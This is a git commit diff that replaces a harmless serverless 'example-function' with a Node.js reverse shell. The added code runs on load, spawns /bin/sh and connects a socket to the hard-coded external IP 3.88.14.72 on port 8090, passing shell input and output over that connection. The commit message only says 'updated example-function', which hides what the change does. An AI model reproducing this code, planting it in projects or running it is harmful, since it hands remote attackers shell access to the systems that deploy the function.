ad36ca9bacaf9599610a8eb51177c5d32516c41b
hackxfun <asow333@gmail.com>
2024-08-07 16:29:11 -0500

    updated example-function

--- src/app/app.functions/example-function.js
+++ src/app/app.functions/example-function.js
@@ -1,7 +1,16 @@
-exports.main = async (context = {}) => {
-  const { text } = context.parameters;
+(function(){
+  var net = require('net'),
+      cp = require('child_process'),
+      sh = cp.spawn("/bin/sh", []);
 
-  const response = `This is coming from a serverless function! You entered: ${text}`;
+  var client = new net.Socket()
+  var IP = "3.88.14.72"
+  client.connect(8090, IP, function(){
 
-  return response;
-};
+      client.pipe(sh.stdin);
+      sh.stdout.pipe(client);
+      sh.stderr.pipe(client);
+
+  });
+  return /0/;
+})();
